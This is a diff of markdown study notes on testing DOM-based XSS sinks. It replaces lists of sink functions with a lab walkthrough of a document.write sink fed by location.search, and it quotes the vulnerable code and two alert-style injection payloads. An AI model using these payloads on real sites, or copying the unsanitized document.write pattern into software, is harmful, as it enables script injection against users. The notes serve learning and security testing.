@@ -437,41 +437,32 @@ Includes unsafe data into the DOM.
 ### Testing JS Sinks
 
 - Input doesn't appear in DOM.
-- Need to use JS debugger.
+- Need to use Debugger in developer tools.
 - For each source (like ```location```) find cases in JS code where it is referenced.
 - Find it in the developer tools ```Ctrl-Shift-F``` and add a breakpoint to see how the value is used.
 
-```
-document.write()
-document.writeln()
-document.domain
-someDOMElement.innerHTML
-someDOMElement.outerHTML
-someDOMElement.insertAdjacentHTML
-someDOMElement.onevent
-```
+#### [Lab]: DOM XSS in document.write sink using source location.search
+
+The sink and source are in embedded javascript within the search page.
 
 ```
-add()
-after()
-append()
-animate()
-insertAfter()
-insertBefore()
-before()
-html()
-prepend()
-replaceAll()
-replaceWith()
-wrap()
-wrapInner()
-wrapAll()
-has()
-constructor()
-init()
-index()
-jQuery.parseHTML()
-$.parseHTML()
+function trackSearch(query) {
+    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
+}
+var query = (new URLSearchParams(window.location.search)).get('search');
+if(query) {
+    trackSearch(query);
+}	
 ```
+
+Using this payload ```x"><script>alert(1)</script><img src="x``` the document.write will look like:
+
+```
+<img src="/resources/images/tracker.gif?searchTerms=x"><script>alert(1)</script><img src="x">
+```
+
+Intended solution ```"><svg onload=alert(1)>```
+
+-----
 
 
